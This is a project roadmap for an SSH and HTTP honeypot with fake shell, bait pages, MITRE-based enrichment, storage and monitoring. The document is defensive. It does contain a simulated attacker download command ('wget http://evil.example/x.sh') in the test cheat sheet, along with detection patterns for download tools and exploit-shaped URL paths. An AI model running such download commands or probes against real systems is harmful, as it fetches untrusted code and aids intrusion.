# HoneyBadger — Incremental Implementation Roadmap

> Status: active · Created 2026-10-22 · Owner: backend
>
> Source of truth for *how* we build the remaining modules: one **connectable
> vertical slice** at a time, each ending in something you can actually attack
> from another terminal.

---

## 0. Purpose of this document

HoneyBadger is specified in `REPO_STRUCTURE.md`, `SYSTEM_ARCHITECTURE.md` and
`README.md`. This document turns that specification into an ordered,
executable sequence of slices, with:

- the exact files touched,
- the design decisions and public function/class shapes,
- unit tests to add,
- a **real connectable test** (SSH / curl / HTTP / DB / metrics) for every slice,
- acceptance criteria and the commit message.

It is a living document: update it when a slice lands or a decision changes.

---

## 1. Guiding principle — connectable vertical slices

**We do not build all modules and then test. We build one slice, connect to it,
commit, and move on.**

Rationale:

1. **Network edges are where surprises live.** asyncssh/aiohttp behaviour (auth
   callbacks, PTY, host keys, timeouts, Windows event loop quirks) cannot be
   predicted by unit tests. We want that feedback on slice 1, not after 15
   modules.
2. **Integration debugging scales badly.** If nothing runs until the end, a
   failure can be in `main.py`, the bus, `sshd.py`, `fakeshell.py`, the
   pipeline, storage or Docker — six suspects at once.
3. **Every slice is demoable.** After slice 1 you can literally
   `ssh -p 8022 root@localhost` and watch an event. That is verifiable progress.
4. **The project is demo-driven** (`docker-compose up` + simulator). Early
   runnable edges de-risk the final demo.

Small leaf modules (`metrics.py`, `retention.py`; `alerts.py` is deferred to
Prometheus rules) are the only things we batch — they are not on the critical
path and do not need their own connectable milestone.

### Slice dependency graph

```
Slice 1  SSH edge (sshd + fakeshell + debug sink)
   │
   ├── Slice 2  HTTP edge (httpd + http_routes)
   │
   └── Slice 3  Enrichment (pipeline + geoip + mitre + credentials + payloads)
          │
          └── Slice 4  Persistence + API (db + storage + api)
                 │
                 └── Slice 5  Observability (metrics + retention; alerts via Prometheus rules)
                        │
                        └── Slice 6  Full stack (Docker, monitoring, dashboard, sim)
```

Slices 1–3 need **no Docker and no database**. Slice 4 introduces PostgreSQL.

---

## 2. Current status (as of 2026-10-22)

### Already implemented and pushed

| Module | State |
|---|---|
| `backend/config.py` | pydantic-settings, `HB_*` env prefix, validation |
| `backend/schemas.py` | `Service`, `Severity`, `LoginInfo`, `GeoInfo`, `RawEvent`, `EnrichedEvent`, `EventOut`; SSH credential rule with handshake exemption (`SSH_HANDSHAKE_KIND`) |
| `backend/bus.py` | generic in-process `EventBus`, concurrent fan-out, per-listener failure isolation, freeze-after-start, graceful `stop()` |
| `backend/sshd.py` | `parse_ssh_handshake()` (RFC 4253 identification string), `make_handshake_event()` — **parser only, no listener yet** |
| `backend/tests/` | `test_config.py` (7), `test_schemas.py` (13), `test_bus.py` (7), `test_ssh_handshake.py` (20) → **47 passing** |
| `pytest.ini` | root config: `pythonpath = backend`, `testpaths = backend/tests` |

Commits: `43a7ae0` (schemas exemption), `ba22d01` (handshake parser),
`6932c0d` (deps split). `main == origin/main`, working tree clean.

### Still empty / not implemented

Backend (slices 1–5): `fakeshell.py`, `httpd.py`, `http_routes.py`,
`pipeline.py`, `geoip.py`, `mitre.py`, `credentials.py`, `payloads.py`,
`storage.py`, `db/models.py`, `api.py`, `metrics.py`, `alerts.py`,
`retention.py`, `main.py`, `Dockerfile`, `sim/`, and
`tests/integration|security/*`.

Docs still empty: `docs/ANALYSIS.md`, `docs/RESPONSIBLE_DISCLOSURE.md`.

Delivered ahead of the backend (see §9): `docker-compose.yml`,
`dashboard/**`, `monitoring/**`, `docs/API.md`, `docs/ARCHITECTURE.md`, and
this roadmap.

### Local tooling

- Python 3.14.7 — invoke with `py` (the `python` name maps to the Microsoft
  Store stub on this machine).
- Installed: `pytest 9.1.1`, `mypy 2.4.0`, `asyncssh 2.24.1`.
- Run everything from the **repo root** unless stated otherwise.

---

## 3. Conventions and definition of done

### Coding conventions

- Python 3.14, full type hints, `from __future__` not required.
- Async-first: every I/O function is `async def`.
- One asyncio loop for the whole backend (no threads, no brokers).
- Never store or log plaintext credentials. Passwords are hashed **at the
  edge** with `sha256:<64 hex>`.
- Payloads are never fetched or executed. Metadata only.
- No attacker-controlled string is reflected into HTML unescaped.

### Definition of done (every slice)

1. Code + type hints; `py -m mypy <touched modules>` clean.
2. Unit tests added; `py -m pytest -q` green (never reduce the count).
3. **Real connectable test executed**; output recorded in the commit message or
   a short note (what you ran, what you saw).
4. Three-to-five logical commits, pushed to `origin/main`.
5. Docs updated if config/behaviour changed (`README.md`, `docs/API.md`,
   `docs/ARCHITECTURE.md`, this file).

### Test conventions

- Plain sync pytest functions; async scenarios wrapped with `asyncio.run(...)`
  (no `pytest-asyncio` dependency).
- Fixtures/builders (`make_raw`, `handshake_event`) instead of repeating dicts.
- Integration tests that bind a socket use **port 0** and `get_port()` so they
  never collide or need a free fixed port.

### Commit message prefixes

`feat(<area>)`, `fix(<area>)`, `chore(<area>)`, `test(<area>)`, `docs(<area>)`.

---

## 4. Slice 1 — SSH edge (first connectable artifact)

### Goal

A real SSH client can connect to `localhost:8022`, authenticate with **any**
username/password, get a fake shell, and every handshake / auth / command is
published to the raw bus and printed by a debug sink.

### Files

| File | Action |
|---|---|
| `backend/sshd.py` | extend with the asyncssh server, auth and session handlers |
| `backend/fakeshell.py` | implement the fake shell |
| `backend/main.py` | wiring: settings → bus → debug sink → SSH server |
| `backend/tests/test_fakeshell.py` | fill the stub |
| `backend/tests/test_sshd_server.py` | **new** — in-process asyncssh client integration tests |
| `backend/requirements.txt` | already has `asyncssh>=2.14` |

### Design

**Host key.** Generate an ephemeral ed25519 key at startup:

```python
server_host_keys = [asyncssh.generate_private_key("ssh-ed25519")]
```

A stable key path (`HB_SSH_HOST_KEY_PATH`) is deliberately deferred to slice 4
(deployment); document the limitation in the startup log. Never commit a key.

**Server entry point** (in `sshd.py`):

```python
async def start_ssh_server(
    settings: Settings, bus: EventBus[RawEvent]
) -> asyncssh.SSHAcceptor:
    return await asyncssh.create_server(
        lambda: SshHoneypotServer(settings, bus),
        settings.ssh_host,
        settings.ssh_port,
        server_host_keys=[_host_key()],
    )
```

**`SshHoneypotServer(asyncssh.SSHServer)`**

| Hook | Behaviour |
|---|---|
| `connection_made(conn)` | store `conn`; schedule `_emit_handshake_once()`; never reject |
| `begin_auth(username)` | return `True` (password auth will be requested) |
| `password_auth_supported()` | return `True` |
| `validate_password(user, password)` | hash the password, publish an auth `RawEvent`, **always return `True`** |
| `session_requested()` | return a `FakeSession` |
| `kbdint_auth_supported()` / `public_key_auth_supported()` | return `False` in v1 |

**Handshake timing (important).** asyncssh calls `connection_made()` **before**
the version exchange, so `conn.get_extra_info("client_version")` is `None`
there (verified in `asyncssh/connection.py`: `_owner.connection_made(self)` is
called immediately before `_send_version()`). Strategy:

- `connection_made()` schedules a bounded background task that polls
  `conn.get_extra_info("client_version")` (e.g. every 50 ms, max 2 s) and emits
  the handshake event as soon as the string appears.
- `begin_auth()` also tries to emit it, as a deterministic fallback for clients
  that authenticate immediately.
- A per-connection `_handshake_emitted` flag guarantees **exactly one**
  handshake event per TCP connection.

The value is the full identification string (`SSH-2.0-OpenSSH_9.6p1`), which
feeds straight into the existing `make_handshake_event(line=...)`.

**FakeSession(`asyncssh.SSHServerSession`)**

- `shell_requested() -> True`, `exec_requested(command) -> True`.
- `session_started()` writes a realistic prompt (`root@honeybadger:~# `).
- `data_received(data, datatype)` accumulates bytes, handles `\r`/`\n`, echoes
  characters, and dispatches each completed line through `fakeshell.dispatch`.
- `exec_requested` runs one command, writes output, then `exit(0)`.
- On dispatch, publish a `RawEvent` with `command=<line>`.

**`fakeshell.py`** — pure, synchronous, trivially testable:

```python
@dataclass
class ShellResult:
    output: str
    cwd: str
    exit_requested: bool = False

class FakeShell:
    def __init__(self, hostname: str = "honeybadger") -> None: ...
    def dispatch(self, line: str) -> ShellResult: ...
```

Commands in slice 1: `pwd`, `whoami`, `id`, `uname [-a]`, `ls [path]`,
`cd <path>`, `cat <file>`, `echo ...`, `history`, `help`, `exit`/`logout`,
unknown → `bash: <cmd>: command not found`.

`wget`/`curl`: return a **fake success** and record the URL via
`payloads.PayloadRecorder` (metadata only). In slice 1 the recorder can be a
minimal stub; slice 3 hardens it.

**Debug sink** (in `main.py`): subscribe *before* `bus.start()` (listeners are
frozen after start):

```python
async def console_sink(event: RawEvent) -> None:
    print(event.model_dump_json())
```

**`main.py` lifecycle**

```python
async def main() -> None:
    settings = get_settings()
    bus: EventBus[RawEvent] = EventBus("raw")
    bus.subscribe(console_sink)
    await bus.start()
    server = await start_ssh_server(settings, bus)
    try:
        await asyncio.Event().wait()          # run until Ctrl+C
    finally:
        server.close()
        await server.wait_closed()
        await bus.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
```

### Events emitted

| Trigger | `service` | `login_info` | `command` | `additional_info` |
|---|---|---|---|---|
| TCP connect / version exchange | `ssh` | `None` | `None` | `event_kind="ssh_handshake"`, `banner`, `protocol`, `client_version` |
| Password attempt | `ssh` | `{username, password_hash}` | `None` | `event_kind="auth"` |
| Shell line | `ssh` | (session creds) | `"ls -la"` | `event_kind="command"` |

### Unit tests

`test_fakeshell.py` (~10): each built-in command, `cd` persistence,
`cd ..`/`cd /`, `cat` of a fake file, unknown command, `exit` flag, `history`,
and that no command ever touches the real filesystem.

`test_sshd_server.py` (~4, in-process integration):

```python
server = await asyncssh.create_server(..., port=0)
port = server.get_port()
async with asyncssh.connect(
    "127.0.0.1", port=port, username="root", password="hunter2",
    known_hosts=None,
) as conn:
    result = await conn.run("whoami", check=False)
    assert "root" in result.stdout
```

- auth succeeds with arbitrary credentials;
- `exec` output matches fakeshell;
- handshake event published exactly once with a non-empty `client_version`;
- auth event carries `sha256:` hash and never the plaintext.

### Real connectable test

Terminal A:

```powershell
cd backend
py main.py
```

Terminal B:

```powershell
ssh -p 8022 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL root@localhost
# password: anything (e.g. hunter2)
whoami
ls
cd /tmp
pwd
exit
```

Optional scanner check:

```powershell
nmap -p 8022 -sV localhost          # if nmap is installed
```

Expected in terminal A: one handshake JSON line, one auth JSON line with
`"password_hash": "sha256:…"`, one line per command.

### Acceptance criteria

- [ ] `ssh` connects and authenticates with any credentials.
- [ ] `whoami`, `ls`, `pwd`, `cd`, `exit` behave like a shell.
- [ ] Exactly one handshake event per connection, with `client_version`.
- [ ] Auth event contains a sha256 hash, never the password.
- [ ] `py -m pytest -q` green; `mypy` clean on touched modules.
- [ ] Ctrl+C shuts down without tracebacks or "Task was destroyed" warnings.

### Commit

```
feat(sshd): serve a connectable fake SSH honeypot with fake shell
```

### Notes / risks

- Windows may show a firewall prompt on first bind to `0.0.0.0:8022` — allow
  it. If the port is busy, set `HB_SSH_PORT=2222`.
- Binding `0.0.0.0` exposes the fake service on the LAN. For local testing use
  `HB_SSH_HOST=127.0.0.1`.
- Do not add "login success" logs that imply a real account.

---

## 5. Slice 2 — HTTP edge

### Goal

`curl` against `localhost:8081` gets believable bait pages, and every request
(including probes and fake login POSTs) becomes a `RawEvent`.

### Files

| File | Action |
|---|---|
| `backend/httpd.py` | aiohttp app + catch-all handler |
| `backend/http_routes.py` | pure bait selection |
| `backend/tests/test_http_routes.py` | **new** unit tests for route selection |
| `backend/main.py` | start the HTTP server alongside SSH |
| `backend/requirements.txt` | add `aiohttp>=3.10` |

### Design

`http_routes.py` stays pure and synchronous:

```python
@dataclass(frozen=True)
class Bait:
    status: int
    content_type: str
    body: str
    headers: dict[str, str]

def select_bait(method: str, path: str) -> Bait: ...
```

Bait table (v1):

| Path | Response |
|---|---|
| `/` | fake corporate intranet index |
| `/wp-login.php` | WordPress-style login form |
| `/admin`, `/administrator` | `401` with `WWW-Authenticate` |
| `/.env` | plausible fake env file (dummy keys, no real secrets) |
| `/api/keys`, `/api/v1/config` | fake JSON credentials |
| `/phpmyadmin`, `/server-status` | probe bait |
| anything else | `404` with a generic server header |

Handler rules:

- Read at most 64 KiB of body; never load unbounded data.
- `POST` to login baits: parse `application/x-www-form-urlencoded`, extract
  `log`/`pwd` or `username`/`password`, hash the password at the edge.
- Publish `RawEvent(service=HTTP, user_agent, http_method, http_path,
  http_status_code, additional_info={...})`.
- **No reflection:** never echo request input into the HTML (XSS safety).
- Server header must look plausible; do not advertise HoneyBadger.

### Events emitted

`service="http"`, `source_ip`, `source_port`, `http_method`, `http_path`,
`http_status_code`, `user_agent`, optional `login_info`, and
`additional_info={"event_kind": "http_request", "headers": {...}}` (headers
whitelisted and truncated).

### Unit tests (`test_http_routes.py`, ~8)

- each known path returns the expected status/content type;
- unknown path → 404;
- login POST path selection;
- fake secrets in `/.env` are obviously dummy (regex check);
- bodies never contain the requested path verbatim (no reflection).

### Real connectable test

Terminal A: `cd backend; py main.py` (now starts SSH + HTTP).

Terminal B:

```powershell
curl.exe -i http://localhost:8081/
curl.exe -i http://localhost:8081/wp-login.php
curl.exe -i http://localhost:8081/.env
curl.exe -i -X POST -d "log=admin&pwd=hunter2" http://localhost:8081/wp-login.php
curl.exe -i http://localhost:8081/does-not-exist
```

Expected: plausible HTML/JSON, and one event line per request in terminal A;
the POST produces `login_info.password_hash` starting with `sha256:`.

### Acceptance criteria

- [ ] All bait paths respond with the documented status.
- [ ] Every request emits exactly one event.
- [ ] Passwords only ever appear hashed.
- [ ] No request input is reflected unescaped.
- [ ] Body size is capped.

### Commit

```
feat(httpd): add aiohttp honeypot with bait routes
```

---

## 6. Slice 3 — Enrichment pipeline

### Goal

Raw events become `EnrichedEvent`s: GeoIP metadata, a MITRE technique, a
severity, and credential counters. Still no database — the debug sink prints
the enriched JSON.

### Files

| File | Action |
|---|---|
| `backend/pipeline.py` | subscriber: raw bus → enrich → enriched bus |
| `backend/geoip.py` | provider interface + `IpApiProvider` + cache |
| `backend/mitre.py` | deterministic rule-based classifier |
| `backend/credentials.py` | `hash_password()` + `CredentialTracker` |
| `backend/payloads.py` | `PayloadRecorder` (metadata only) |
| `backend/fakeshell.py` | route `wget`/`curl` through `PayloadRecorder` |
| `backend/main.py` | wire raw → pipeline → enriched → console sink |
| `backend/tests/test_mitre.py` | fill the stub |
| `backend/tests/test_pipeline.py` | fill the stub |
| `backend/tests/test_geoip.py` | **new** — cache/TTL/fail-open with a fake provider |
| `backend/tests/test_credentials.py` | **new** — hashing + counters |

### Design

**`pipeline.py`**

```python
class Pipeline:
    def __init__(self, geo: GeoIpProvider, tracker: CredentialTracker,
                 enriched_bus: EventBus[EnrichedEvent]) -> None: ...

    async def handle(self, event: RawEvent) -> None:
        geo_info = await self._geo.lookup(event.source_ip)      # fail-open
        technique = classify(event, self._tracker)
        severity = SEVERITY_BY_TECHNIQUE.get(technique)
        self._tracker.record(event)
        enriched = EnrichedEvent(**event.model_dump(),
                                 geo_info=geo_info,
                                 technique_id=technique,
                                 severity=severity)
        self._enriched_bus.publish(enriched)
```

`handle` must never raise: any enrichment failure is logged and the event is
still published (fail-open), preserving the bus isolation guarantee.

**`geoip.py`**

```python
class GeoIpProvider(Protocol):
    async def lookup(self, ip: IPv4Address | IPv6Address) -> GeoInfo | None: ...
```

- `IpApiProvider`: `GET http://ip-api.com/json/{ip}?fields=...`, 5 s timeout,
  in-memory TTL cache (`geoip_cache_ttl_days`, default 30), negative caching for
  failures, `None` on any error.
- `NullProvider`: always `None` — used by tests and offline demos.
- `MaxMindProvider`: opt-in via `maxmind_db_path`; deferred if the dependency
  is not installed (log a warning and fall back to `NullProvider`).

**`mitre.py`** — pure function, deterministic precedence (first match wins):

| Priority | Predicate | Technique |
|---|---|---|
| 1 | `(username, password_hash)` seen ≥ 3 times in the window | `T1110.004` |
| 2 | SSH auth event (credentials present) | `T1110` |
| 3 | `command` matches `wget\|curl\|tftp\|scp\|ftp` | `T1105` |
| 4 | any other shell `command` | `T1059` |
| 5 | HTTP exploit-shaped path/query (`..`, `%00`, `cmd=`, `shell.php`) | `T1190` |
| 6 | probe paths (`.env`, `/wp-login.php`, `/admin`, `/phpmyadmin`, …) or handshake-only event | `T1595` |
| 7 | authenticated session context, no stronger match | `T1078` |

Severity: `T1595 low`, `T1110 medium`, `T1059 medium`, `T1110.004 high`,
`T1105 high`, `T1190 high`, `T1078 high`.

**`credentials.py`**

- `hash_password(password: str) -> str` → `"sha256:" + sha256(...).hexdigest()`
  (this is the single implementation; `sshd.py` imports it from here).
- `CredentialTracker`: in-memory `dict[(username, hash), count]` + a
  `top(n)` view for the dashboard; windowed counts for T1110.004.

**`payloads.py`**

- `PayloadRecorder.record(url: str) -> PayloadMeta` — URL, `hash=None`,
  `size=None`; **never fetches**. `wget`/`curl` in fakeshell return
  `200 OK`-style fake output and attach `payload_url` to the event.

### Unit tests

`test_mitre.py` (~12): one test per technique plus precedence conflicts
(e.g. `wget` beats `T1059`; repeated credentials beat plain `T1110`).

`test_pipeline.py` (~6): raw event → enriched event; geo provider failure still
publishes; severity mapping; tracker updated; enriched bus receives it.

`test_geoip.py` (~5): cache hit avoids a second HTTP call; TTL expiry;
network error → `None`; invalid IP → `None`; `NullProvider`.

`test_credentials.py` (~5): known hash vector, lowercase format, tracker counts,
top-N ordering.

### Real connectable test

1. Start the backend (`py main.py`) with `HB_GEOIP_PROVIDER` default.
2. `ssh -p 8022 root@localhost`, log in three times with the **same** password.
3. `curl.exe -i http://localhost:8081/.env`
4. In the sink, expect:
   - SSH auth events → `"technique_id":"T1110"`, `"severity":"medium"`;
   - third identical attempt → `"T1110.004"`, `"severity":"high"`;
   - `.env` probe → `"T1595"`, `"severity":"low"`;
   - GeoIP fields populated when online (otherwise `geo_info` is `null` — that
     is acceptable, fail-open).

Offline check: `py -m pytest backend/tests/test_mitre.py -v` must pass without
network.

### Acceptance criteria

- [ ] Every raw event produces exactly one enriched event.
- [ ] `technique_id` and `severity` are always set (or deliberately `null` for
      unclassifiable events).
- [ ] Enrichment failures never drop the event.
- [ ] No plaintext password anywhere; only `sha256:` values.
- [ ] Tests pass with no network access.

### Commit

```
feat(pipeline): enrich events with GeoIP, MITRE techniques, and credentials
```

---

## 7. Slice 4 — Persistence and API

### Goal

Enriched events survive restarts and are queryable over HTTP:
`curl localhost:8090/events` returns what you just generated.

### Files

| File | Action |
|---|---|
| `backend/db/models.py` | SQLAlchemy models |
| `backend/db/migrations/001_init.sql` | initial schema (for compose/postgres init) |
| `backend/storage.py` | engine, session factory, repositories |
| `backend/api.py` | REST + WebSocket |
| `backend/main.py` | DB pool, storage listener, API server, retry/wait |
| `backend/tests/test_storage.py` | **new** — repositories against SQLite |
| `backend/tests/test_api.py` | **new** — REST contract |
| `backend/requirements.txt` | `sqlalchemy[asyncio]>=2`, `asyncpg>=0.29` |
| `backend/requirements-dev.txt` | `aiosqlite>=0.20` |

### Design

**Tables** (per `SYSTEM_ARCHITECTURE.md` §3.4):

- `events`: `id`, `ts`, `service`, `source_ip INET`, `source_port`,
  `destination_ip`, `destination_port`, `username`, `pass_hash`, `user_agent`,
  `http_method`, `http_path`, `http_status_code`, `command`, `payload_url`,
  `payload_hash`, `payload_size`, `technique_id`, `severity`, `geo_*`,
  `additional_info JSONB`.
- `credential_counts`: `username`, `pass_hash`, `count`, `last_seen`.
- `payloads`: `url`, `hash`, `size`, `quarantined`.
- `geo_cache`: `ip`, `geo JSONB`, `expires_at`.
- Indexes: `(source_ip, ts)`, `(service, ts)`, `(technique_id)`.

**`storage.py`**

```python
class Storage:
    async def init(self) -> None: ...          # create_all for dev
    async def close(self) -> None: ...
    async def add(self, event: EnrichedEvent) -> None: ...
    async def list_events(self, *, service=None, limit=100) -> list[EventOut]: ...
    async def stats(self) -> dict[str, Any]: ...
```

`init()` retries the connection (e.g. 10 × 2 s) because compose may start the
backend before PostgreSQL is ready.

**`api.py`** — aiohttp (same framework as the HTTP honeypot):

- `GET /health` → `{"status": "ok", "db": "ok", "version": "0.1.0",
  "uptime_s": 42}`; `503` with `{"error": "unavailable"}` when the database is
  not reachable (the dashboard banner reads `db`/`version`/`uptime_s`)
- `GET /events?limit=&service=&since=` → list of `EventOut`
- `GET /stats` → counts, top credentials, technique breakdown, top source IPs
- `WS /ws/events` → live broadcast of each enriched event
- Input validation: `limit` capped (e.g. 1..1000); unknown query params ignored.

**Wiring:** subscribe a storage listener **and** a WS broadcaster to the
enriched bus before `start()`; both must fail-open.

### Unit tests

- `test_storage.py` (~6): insert/read round-trip on SQLite+aiosqlite; filters;
  stats shape; `EventOut` serialisation.
- `test_api.py` (~6): `/health`; `/events` returns inserted rows; `limit`
  cap; unknown service → 400; WS receives a published event (aiohttp test
  utils, no fixed port).

### Real connectable test

Start PostgreSQL (no full compose yet):

```powershell
docker run -d --name hb-postgres `
  -e POSTGRES_USER=honeybadger -e POSTGRES_PASSWORD=honeybadger `
  -e POSTGRES_DB=honeybadger -p 5432:5432 postgres:16
```

Run the backend with the local DSN:

```powershell
cd backend
$env:HB_DATABASE_URL="postgresql+asyncpg://honeybadger:honeybadger@localhost:5432/honeybadger"
py main.py
```

Generate events (SSH login + `curl`), then:

```powershell
curl.exe http://localhost:8090/health
curl.exe "http://localhost:8090/events?limit=5"
curl.exe http://localhost:8090/stats
```

Expected: `/events` returns the generated events newest-first; `/stats` shows
counts and top credentials (hashes only). Verify persistence:

```powershell
docker exec hb-postgres psql -U honeybadger -d honeybadger -c `
  "select service, username, pass_hash, technique_id from events order by ts desc limit 5;"
```

Check no plaintext: `select count(*) from events where pass_hash not like 'sha256:%';` → `0`.

### Acceptance criteria

- [ ] Events survive a backend restart.
- [ ] `/events`, `/stats` return correct data.
- [ ] WebSocket pushes a live event.
- [ ] No plaintext password in any table.
- [ ] Backend tolerates PostgreSQL starting late.

### Commit

```
feat(storage,api): persist enriched events and expose REST/WebSocket
```

---

## 8. Slice 5 — Observability (batched leaf modules)

### Goal

Prometheus can scrape the backend, Prometheus rules fire meaningful alerts, and
old events are purged.

### Files

| File | Action |
|---|---|
| `backend/metrics.py` | Prometheus exporter on `:8000` |
| `backend/retention.py` | daily purge older than `retention_days` |
| `backend/tests/test_metrics.py`, `test_retention.py` | **new** |
| `backend/requirements.txt` | `prometheus-client>=0.20`, `aiohttp` (already) |

### Design

**Metrics** (`metrics.py`): start `prometheus_client.start_http_server(8000)`
in a daemon thread (the only sanctioned thread — exporters are not asyncio
aware), and expose:

- `hb_events_total{service,technique,severity}`
- `hb_credentials_attempts_total`
- `hb_http_requests_total{status}`
- `hb_db_events` (gauge, updated by retention)
- `hb_pipeline_errors_total`

Subscribe to the enriched bus and increment; never block.

**Alerts — deferred; Prometheus owns them.** `backend/alerts.py` is not
implemented and the backend does not push to Alertmanager. Alert rules live in
`monitoring/prometheus/rules/alerts.yml` (fire on brute-force rate, payload
capture, retention lag and service health) and are evaluated by Prometheus,
which routes to Alertmanager. There are no `HB_ALERT_*` settings.

**No "login success" alert** (the honeypot always accepts credentials).

**Retention** (`retention.py`): every 24 h, `DELETE FROM events WHERE timestamp <
now() - retention_days`; log the deleted count; update `hb_db_events`.

### Unit tests (~7 total)

- metrics counters increment exactly once per event;
- retention deletes only rows older than the cutoff (frozen clock);
- retention is idempotent;
- no alert type for login success.

### Real connectable test

```powershell
py main.py
curl.exe http://localhost:8000/metrics | Select-String "hb_events_total"
promtool check rules monitoring/prometheus/rules/alerts.yml
```

Expected: counters present and increasing after you generate traffic, and the
Prometheus rule file validates. Run retention with a tiny window in a test
database and confirm rows disappear.

### Acceptance criteria

- [ ] `/metrics` exposes the documented metric families.
- [ ] Counters match generated traffic.
- [ ] Prometheus rules validate and fire above the configured threshold.
- [ ] Retention deletes only expired rows.

### Commit

```
feat(monitoring): add metrics exporter and retention purge
```

---

## 9. Slice 6 — Full stack, dashboard, and demo

### Goal

`docker-compose up --build` brings up the whole suite; the simulator generates
realistic attacks; the dashboard shows live events, stats, and a map.

### Delivered ahead of backend (2026-10-22)

These exist and are validated independently of the empty backend slices:

- **`docker-compose.yml`** — complete 7-service stack (postgres, backend,
  dashboard, prometheus, alertmanager, grafana, dev-only `fixtures` profile),
  explicit `honeybadger` bridge network, named volumes. `docker compose config
  -q` passes. The empty `backend/Dockerfile` is the only gated build; every
  other service can start on its own.
- **`dashboard/**`** — single-page React threat-ops console (live WS feed, KPIs,
  activity chart, technique mix, world map, top credentials/sources, payloads),
  `VITE_API_MODE=mock` mode, nginx proxying `/api` + `/ws` to `backend:8090`.
  It implements the contract in `docs/API.md`.
- **`monitoring/prometheus/**`** — scrape config, `alerts.yml` (the single
  source of alert thresholds) and recording rules.
- **`monitoring/alertmanager/**`** — routing config for alerts from Prometheus.
- **`monitoring/grafana/**`** — provisioning plus three dashboards: Overview,
  Attack Patterns, Pipeline Health.
- **`monitoring/fixtures/**`** — dev-only synthetic metrics exporter (`:9101`)
  so Grafana can be previewed before `backend/metrics.py` exists.
- **`docs/API.md`, `docs/ARCHITECTURE.md`** — agreed wire contract and
  architecture map.

Not delivered yet: the backend slices themselves, `backend/Dockerfile`,
`backend/sim/simulate.py`, and the integration/security scripts.

### Files

| Area | Files |
|---|---|
| Backend image | `backend/Dockerfile`, `.dockerignore` (exists) |
| Orchestration | `docker-compose.yml` |
| Monitoring | `monitoring/prometheus/**`, `monitoring/grafana/**`, `monitoring/alertmanager/**`, `monitoring/fixtures/**` |
| Dashboard | `dashboard/package.json`, `vite.config.ts`, `Dockerfile`, `nginx.conf`, `src/**` |
| Simulator | `backend/sim/simulate.py` |
| Integration/security tests | `tests/integration/*.sh`, `tests/integration/test_api_contract.py`, `tests/security/*.sh`, `tests/fixtures/` |
| Docs | `docs/ARCHITECTURE.md`, `docs/API.md`, `docs/ANALYSIS.md`, `docs/RESPONSIBLE_DISCLOSURE.md` |

### Design

**Backend Dockerfile**: `python:3.14-slim` (or 3.13 if 3.14 slim is not yet
published), non-root user, `pip install -r requirements.txt`, `CMD ["python",
"main.py"]`. `.env` must never be copied into the image.

**Compose services**: `backend` (8022/8081/8000/8090), `postgres` (loopback
`127.0.0.1:5432`), `prometheus` (9090), `alertmanager` (9093), `grafana`
(host 3001 → container 3000), `dashboard` (3000 → 80), plus the dev-only
`fixtures` profile. PostgreSQL is healthchecked and the backend waits on
`service_healthy`; the dashboard depends on `service_started` because the
backend image has no healthcheck yet (adding one would block forever on an
unimplemented image). Prometheus and Grafana use healthchecks.

**Containment vs GeoIP — decided.** The demo network is a plain bridge (not
`internal: true`) because the default `ip-api` GeoIP provider needs egress; the
honeypot never connects to attacker-supplied hosts. Tightening containment —
allow-lists, offline MaxMind/GeoLite2, or `NullProvider` — remains a
backend-slice decision and a documented exception, not silent internet access.

**Dashboard** (React + Vite + TypeScript): single-page console with a live feed
over `/ws/events`; stats via REST polling; activity chart, technique mix, top
credentials/sources, payloads, and a geo map. `VITE_API_MODE=mock` runs it
without a backend; nginx proxies `/api` and `/ws` to `backend:8090`.

**Simulator** (`sim/simulate.py`): drives real connections against the
honeypot (SSH auth attempts with varying credentials, HTTP probes/payload
downloads). It asserts that generated attacks produce the expected technique
tags — this doubles as an integration test of the classifier.

**Integration/security scripts**

- `test_end_to_end.sh`: compose up → simulate → assert API/dashboard data.
- `test_network_isolation.sh`: from inside the honeypot network, assert no
  egress (except the documented dev profile).
- `test_credentials.sh`: query PostgreSQL and fail if any credential column
  contains anything but `sha256:<hex>`.
- `test_api_contract.py`: validate the intake contract against `schemas.py`.

### Manual test

```powershell
docker compose up --build -d
docker compose ps
curl.exe http://localhost:8090/health
py -m sim.simulate        # or: docker compose exec backend python -m sim.simulate
# open dashboard http://localhost:3000
# open Grafana     http://localhost:3001
```

Expected: dashboard shows live simulated events; Prometheus targets are `UP`;
security scripts pass.

### Acceptance criteria

- [ ] One command brings the stack up healthy.
- [ ] Simulator traffic appears live in the dashboard and API.
- [ ] Prometheus scrapes backend; Grafana dashboards render.
- [ ] `test_network_isolation.sh` and `test_credentials.sh` pass.
- [ ] `docker compose down` leaves no stray containers/volumes used by tests.

### Commit

```
feat: ship the deployable stack with dashboard, monitoring, simulator, and security tests
```

---

## 10. Cross-cutting concerns

### Config fields added over time

| Slice | New `HB_*` fields |
|---|---|
| 1 | (none) — uses `ssh_host`, `ssh_port` |
| 2 | (none) — uses `http_host`, `http_port` |
| 3 | (none) — uses `geoip_provider`, `geoip_cache_ttl_days` |
| 4 | (none) — uses `database_url`, `api_host`, `api_port` |
| 5 | (none) — alert thresholds live in `monitoring/prometheus/rules/alerts.yml` |
| 6 | `HB_SSH_HOST_KEY_PATH` (stable key for deployment) |

Every new field needs: `config.py` + `.env.example` + `test_config.py`.

### Requirements growth

| Slice | Runtime | Dev |
|---|---|---|
| 1 | `asyncssh` (already) | — |
| 2 | `aiohttp` | — |
| 3 | — | — |
| 4 | `sqlalchemy[asyncio]`, `asyncpg` | `aiosqlite` |
| 5 | `prometheus-client` | — |
| 6 | — | `pytest-cov` (optional) |

### Test files added (update `REPO_STRUCTURE.md`)

`test_sshd_server.py`, `test_http_routes.py`, `test_geoip.py`,
`test_credentials.py`, `test_storage.py`, `test_api.py`, `test_metrics.py`,
`test_retention.py`.

---

## 11. Manual test cheat sheet

```powershell
# --- test suite ---
py -m pytest -q
py -m pytest -k handshake -v
py -m pytest --collect-only -q

# --- type checks ---
py -m mypy backend/bus.py backend/sshd.py backend/schemas.py backend/config.py

# --- run the backend (slices 1-3) ---
cd backend
py main.py

# --- SSH (any password) ---
ssh -p 8022 -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL root@localhost
whoami
ls -la
cd /tmp
pwd
wget http://evil.example/x.sh
exit

# --- HTTP ---
curl.exe -i http://localhost:8081/
curl.exe -i http://localhost:8081/wp-login.php
curl.exe -i http://localhost:8081/.env
curl.exe -i -X POST -d "log=admin&pwd=hunter2" http://localhost:8081/wp-login.php

# --- API (slice 4+) ---
curl.exe http://localhost:8090/health
curl.exe "http://localhost:8090/events?limit=5"
